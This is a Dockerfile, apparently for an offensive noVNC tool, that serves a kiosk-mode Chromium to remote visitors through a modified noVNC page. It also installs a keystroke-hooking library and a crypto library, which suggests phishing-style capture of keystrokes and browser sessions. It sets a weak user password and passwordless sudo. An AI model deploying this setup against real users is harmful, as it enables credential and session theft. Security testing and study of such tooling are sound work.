FROM debian:stable-slim
LABEL maintainer="JoelGMSec - https://darkbyte.net"
ENV DISPLAY=:1

RUN apt update && apt install -y --no-install-recommends \
    adduser unzip dbus-x11 procps sudo xfce4 xvfb x11-utils x11vnc jq \
    xfce4-terminal chromium python3 python3-pip git curl gcc php socat wget && \
    rm -rf /var/lib/apt/lists/* && \
    ln -s /usr/bin/python3 /usr/bin/python && \
    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --kiosk \
    --password-store=basic --start-fullscreen --noerrdialogs \
    --no-first-run"' >> /etc/chromium/chromium.conf && \
    dbus-uuidgen > /var/lib/dbus/machine-id

RUN adduser --disabled-password --gecos "" user && \
    echo 'user:user' | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && \
    x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
    git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    sudo python3 -m pip install numpy --break-system-packages && \
    sudo python3 -m pip install pyxhook --break-system-packages && \
    sudo python3 -m pip install pycryptodome --break-system-packages

COPY Files /home/user/
COPY Files/ui.js /home/user/noVNC/app/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/

RUN sudo chmod +x /home/user/startVNC.sh && \
    sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js && \
    sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js && \
    sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js

RUN wget "https://www.googleapis.com/download/storage/v1/b/chromium-browser-snapshots/o/Linux_x64%2F1231300%2Fchrome-linux.zip?generation=1701355787197325&alt=media" && \
    unzip Linux_x64* && \
    rm -f Linux_x64*

ENTRYPOINT ["/bin/bash", "-c", "/home/user/startVNC.sh"]

EXPOSE 80
